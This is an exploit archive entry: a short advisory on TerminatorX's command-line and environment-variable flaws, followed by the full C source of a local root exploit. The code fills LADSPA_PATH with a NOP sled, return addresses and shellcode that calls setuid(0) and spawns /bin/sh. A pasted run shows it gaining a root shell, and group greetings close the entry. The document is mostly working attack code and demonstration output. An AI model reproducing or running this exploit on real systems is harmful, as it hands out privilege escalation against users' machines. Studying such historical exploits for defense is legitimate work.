source: http://www.securityfocus.com/bid/8993/info
 
It has been reported that TerminatorX may be prone to multiple vulnerabilities when handling command-line and environment variable data. As a result, an attacker may be capable of exploiting the application in a variety of ways to execute arbitrary code with elevated privileges. It should be noted that TerminatorX is not installed setuid by default, however the author recommends that users make the application setuid root.

/*
Local terminatorX local root exploit 
Using LADSPA_PATH enviroment variable vulnerability
As discovered and explained by c0wboy (www.0x333.org), thanks for spotting the bugs.
Explained here --> http://packetstormsecurity.nl/filedesc/outsiders-terminatorX-001.txt.html

*note i have seen other exploits using the switch vulns , but not the env variable.






[rza@shoalin buffs]$ ./FBHterminator 2000

**********************************************
        Local TerminatorX Root Exploit
        Coded By Bobby of FBH
        Using Ret at --> 0xbfffdad8

**********************************************

Spawing Shell....
terminatorX Release 3.81 - Copyright (C) 1999-2003 by Alexander K�nig
terminatorX comes with ABSOLUTELY NO WARRANTY - for details read the license.
+ tX_warning: engine_thread_entry() - engine has no realtime priority scheduling.
ALSA lib seq_hw.c:446:(snd_seq_hw_open) open /dev/snd/seq failed: No such file or directory
* tX_error: tX_midiin(): failed to open the default sequencer device.
/home/rza/.terminatorXrc:60: error: Premature end of data in tag midi_connections line 59

^
/home/rza/.terminatorXrc:60: error: Premature end of data in tag terminatorXrc line 6

^
tX: err: Error parsing terminatorXrc.
tX: Failed loading terminatorXrc - trying to load old binary rc.
* tX_error: tX: Error: couldn't access directory "1�1۰�1�Ph//shh/bin�PS�1�1��
                                                                              �1�1۰�������������������������������������������������������������������������
�������������������������������������������������������������������������������
�������������������������������������������������������������������������������
�������������������������������������������������������������������������������
�������������������������������������������������������������������������������
�������������������������������������������������������������������������������
�������������������������������������������������������������������������������
sh-2.05b# 


*NOTE -- offset 2000 works , tested on Mandrake 9.2 :)


And Now for some Fun and greetz to my boyz...

GREETZ and SHOUTZ to : All the FBH crew : Abunasar , bobby(hey thats me), numan, the-past,
		       All the USG crew : rD , ShellCode, inkubus, LinuxLover
		       All the AIC crew : attic , mrgreat , others..
	
	Other Greetz To: Hein , johan , Dj-king , Kafka , hyperd0t ,satanic souls, 
			 hB, SecureT,wazzabi,c1sco,coredump_,BlooDMASK and everyone in #usg channel

Email --> FBHowns@hushmail.com

coded by bobby of FBH
thank you

*/

	
		       

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BINARY "/usr/local/bin/terminatorX" //default path
#define BUFFERSIZE 5100 // why oh why?
#define NOP 0x90


		     /*shellcode from Uhagr.org */

char shellcode [] = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
                   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
                   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
                   "\x80\xe8\xdc\xff\xff\xff/bin/sh";




unsigned long getesp()
{
	__asm__("movl %esp, %eax");
}


int main(int argc, char *argv[]) {

	char buff[BUFFERSIZE];
	int ret , i,*bob,j;

	if(argc < 2) {
			ret = getesp();
 		}

	else {
		ret = getesp() - atoi(argv[1]);
	}
	printf("\n**********************************************\n");
	printf("\tLocal TerminatorX Root Exploit\n");
	printf("\tCoded By Bobby of FBH\n");
	printf("\tUsing Ret at --> 0x%x\n", ret);
	printf("\n**********************************************\n\n");
	printf("Spawing Shell....\n\n");
	sleep(2);
	bob = (int *)(buff);

	//fill up buffer with the ret
	for (i = 0; i < BUFFERSIZE - 1; i += 4)
		*bob++ = ret;
	*bob=0x0;

	//padding the first half with 0x90
	for (i = 0; i < (BUFFERSIZE - 1) / 2; i++)
		buff[i] = NOP;

	//placing shellcode in prepared buffer
	for (j = 0; j < strlen(shellcode); j++)
		buff[i++] = shellcode[j];

	
	setenv("LADSPA_PATH",buff,1);
	execl(BINARY, BINARY, NULL);
	perror("execl");
}
 
